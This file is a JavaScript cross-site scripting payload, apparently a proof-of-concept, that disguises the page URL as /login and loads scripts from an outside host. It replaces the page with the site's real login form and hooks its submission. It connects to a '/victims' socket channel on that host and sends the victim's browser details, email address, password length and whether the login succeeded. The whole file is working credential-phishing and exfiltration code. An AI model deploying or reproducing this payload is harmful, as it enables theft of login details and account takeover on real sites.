var host = window.location.host;
var path = '/login';
var socket = null;

// The page URL is so ugly; let's pretend we're visiting a more reassuring URL
if (window.history && history.replaceState) {
  history.replaceState(null, 'Log in', path);
}

// We're lazy, so we'll use jQuery
loadScript('https://test.orr.me.uk:8443/socket.io/jq.js');

// Once jQuery is ready, use it to replace the current ugly page with the real login page
waitFor('jQuery', function($) {
  $.get('//' + host + path, setPageContent);
});

// Let's also load socket.io so that we can be more social
loadScript('https://test.orr.me.uk:8443/socket.io/socket.io.js');

// Once socket.io is ready, let's tell all our friends that we're online!
waitFor('io', function(io) {
  socket = io.connect('https://test.orr.me.uk:8443/victims', {secure: true});
  socket.emit('info', navigator.userAgent);
});

function setPageContent(html) {
  // Replacing the root HTML tag maybe isn't possible?
  // Anyway, this is ugly but works fine
  $(document.body).html(html);
 
  // The login page has a nicer title, so let's use that
  document.title = $('body title').text();

  // Make sure we hear about any login attempts...
  $('form').submit(submitForm);
}

function submitForm(e) {
  // Aw, that's unfortunate
  if (socket === null) {
    return true;
  }

  // Tell everyone that we're going to log in. Yay!
  var user = $('#user_session_email').val();
  var pass = $('#user_session_password').val();
  socket.emit('submit', { 'user': user, 'pass_length': pass.length });

  // Prevent the form from being submitting normally
  e.preventDefault();
  
  // But we'll be nice and check that the credentials are valid
  $('button')[0].disabled = true;
  $.ajax({
    type: 'POST',
    url:  '/user_session',
    data: { 'user_session[email]': user, 'user_session[password]': pass },
    complete: function(rsp) {
      // If we didn't get redirected, the login was a failure
      var redirect, message;
      if (rsp.status == 200) {
        message = 'failed';
        redirect = path;
      } else {
        message = 'SUCCESS!'
        redirect = '/';
      }

      // Report back the result, and redirect the user to where they should be.
      // But wait a wee moment so that all our friends get the message we sent
      socket.emit('result', message);
      setTimeout(function() { window.location.href = redirect; }, 500);
    }
  });
}

function waitFor(property, callback) {
  if (window.hasOwnProperty(property)) {
    callback(window[property]);
  } else {
    setTimeout(function() { waitFor(property, callback); }, 50);
  }
}

function loadScript(url) {
  var tag = document.createElement('script');
  tag.src = url;
  document.getElementsByTagName('head')[0].appendChild(tag);
}
